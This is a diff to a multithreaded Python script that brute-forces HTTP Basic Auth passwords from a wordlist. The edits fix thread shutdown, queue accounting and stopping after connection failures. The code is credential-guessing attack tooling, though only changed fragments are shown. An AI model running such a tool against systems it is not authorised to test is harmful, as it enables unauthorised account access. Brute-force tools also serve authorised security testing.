@@ -200,9 +200,7 @@ def test_password(pwd, line_number):
             with results_lock:
                 print(f"Error: Connection failed - {e}")
                 connection_failed = True
-                # If this is early in the scan, it's likely the target is unreachable
-                if line_number <= 2:
-                    found_password = True  # Signal other threads to stop
+                found_password = True  # Signal all threads to stop immediately
             return False
         except requests.exceptions.Timeout:
             if verbose:
@@ -222,20 +220,26 @@ def test_password(pwd, line_number):
 
 def worker():
     """Worker thread function"""
-    while not found_password:
+    while True:
         try:
             pwd, line_number = password_queue.get(timeout=1)
             if pwd is None:  # Sentinel value to stop worker
+                password_queue.task_done()
                 break
-            test_password(pwd, line_number)
             
-            # Apply delay between requests
-            if delay > 0:
-                sleep(delay / 1000.0)
+            if not found_password:
+                test_password(pwd, line_number)
                 
+                # Apply delay between requests only if not stopped
+                if delay > 0 and not found_password:
+                    sleep(delay / 1000.0)
+            
+            # Always mark task as done
             password_queue.task_done()
+                
         except queue.Empty:
-            continue
+            # If queue is empty, exit
+            break
 
 print(f"Starting HTTP Basic Auth brute force against: {target}")
 print(f"Username: {username}")
@@ -274,15 +278,8 @@ try:
             emptyCount = 0
             
             # Only queue non-empty passwords
-            if pwd.strip():
+            if pwd.strip() and not found_password:
                 password_queue.put((pwd, currentLine))
-                
-                # Check if we should stop early due to connection failures
-                if currentLine >= 2:  # Check after just 2 attempts
-                    sleep(0.05)  # Give threads time to process
-                    if found_password:  # Will be set to True if connection fails early
-                        print("\nStopping scan due to connection failures.")
-                        break
             
             pwd = f.readline().rstrip('\n')
             
